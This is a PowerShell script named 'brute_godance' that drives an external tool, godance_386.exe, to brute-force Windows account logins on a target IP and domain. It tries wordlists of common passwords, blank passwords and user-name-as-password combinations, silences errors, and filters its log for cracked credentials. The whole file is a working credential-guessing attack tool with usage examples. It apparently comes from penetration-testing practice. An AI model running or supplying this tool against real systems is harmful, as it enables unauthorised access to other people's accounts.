$name="brute_godance"
$version="1.0"
$ProgressPreference = 'SilentlyContinue'	
$ErrorActionPreference = 'SilentlyContinue'


$global:target=$args[0]
$global:domain=$args[1]
$global:userlist=$args[2]
$global:custompass=$args[3]


if (!$domain) { 
# if no domain is given then set it to a '.' 
$global:domain="."
}

if (!$userlist) { 
$global:userlist="users.txt"
}

function debug {
echo "----------------------------"
echo "target:		$target"
echo "userlist:		$userlist"
echo "domain:		$domain"
echo "custompass:	$custompass"
echo "----------------------------"
}  



function godance-check-cracked {
Get-Content .\godance_brute.log | findstr "In hacker voice" | sort-object| Get-Unique > godance_brute_cracked.txt
Write-Output ""
Get-Content .\godance_brute_cracked.txt
}

function godance-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
.\godance_386.exe -d $domain -u $userlist -w pass_password.txt -h $target >> godance_brute.log #2>$nul
Write-Output ""
godance-check-cracked
}
function godance-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
.\godance_386.exe -d $domain -u $userlist -w pass5.txt -h $target >> godance_brute.log #2>$nul
Write-Output ""
godance-check-cracked
}
function godance-userpass {
Write-Output ""
Write-Output "[+] user = pass "
Write-Output ""
ForEach ($user in Get-Content $userlist) {
echo $user | Out-File -Encoding ascii tempuser.txt
.\godance_386.exe -d $domain -u tempuser.txt -w tempuser.txt -h $target >> godance_brute.log
del tempuser.txt
}
Write-Output ""
godance-check-cracked
}
function godance-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
.\godance_386.exe -d $domain -u $userlist -w pass_blank.txt -h $target >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}
function godance-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
.\godance_386.exe -d $domain -u $userlist -w pass10.txt -h $target >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}
function godance-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
.\godance_386.exe -d $domain -u $userlist -w pass100.txt -h $target >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}
function godance-custompass {
Write-Output ""
Write-Output "[+] $custompass"
Write-Output ""
.\godance_386.exe -d $domain -u $userlist -w $custompass -h $target >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}


function run-godance {
godance-password
godance-pass5
godance-userpass
godance-blank
godance-pass10
godance-pass100
#  
#if (!$custompass) { 
#godance-custompass
#}
#


}


if ($target) { 
echo "" > .\godance_brute.log
debug
run-godance | Tee godance_brute.txt
} else {
Write-Host "$name $version" 
Write-Host "============================" 
Write-Host "USEAGE: " 
Write-Host "	./$name.ps1 [IP ADDRESS] [DOMAIN] [USER LIST] [PASS LIST]" 
Write-Host ""
Write-Host "EXAMPLES"
Write-Host "	./$name.ps1 192.168.80.50"
Write-Host "	./$name.ps1 192.168.80.50 INECURE.local" 
Write-Host "	./$name.ps1 172.16.0.10 secure users.txt pass3k.txt" 
Write-Host "" 
Write-Host "POSITIONS"
Write-Host "	1	IP ADDRESS - required! wont run without this" 
Write-Host "	2	DOMAIN - optional - will default to '.'" 
Write-Host "	3	USER LIST - optional - will default to .\users.txt" 
Write-Host "	4	PASS LIST - optional - can give it your own password list to run at the end" 
Write-Host "" 
Write-Host "" 
}



